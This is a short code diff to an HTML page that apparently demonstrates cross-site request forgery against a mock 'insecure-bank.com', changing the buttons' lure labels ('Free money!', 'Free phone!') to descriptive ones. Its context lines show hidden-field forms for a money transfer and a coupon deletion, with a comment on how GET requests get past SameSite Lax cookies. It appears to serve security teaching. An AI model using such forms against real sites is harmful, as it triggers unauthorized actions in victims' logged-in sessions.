@@ -85,7 +85,7 @@
         <input type="hidden" id="amount" name="amount" value="1000">
         <input type="hidden" id="coupon" name="coupon" value="">
         <input type="hidden" name="csrfToken" value="">
-        <button type="submit">Free money!</button>
+        <button type="submit">Transfer money!</button>
     </form>
 
     <!-- Sends a GET request with top level navigation. This will work as the GET request is safe for LAX cookies
@@ -93,7 +93,8 @@
     <form id="deleteCouponForm" method="GET" action="http://insecure-bank.com/delete-coupon">
         <input type="hidden" id="code" name="code" value="ALICE50">
         <input type="hidden" name="csrfToken" value="">
-        <button type="submit" id="deleteCoupon">Free phone!</button>
+        <button type="submit" id="deleteCoupon">Delete coupon!</button>
     </form>
+
 </body>
 </html>
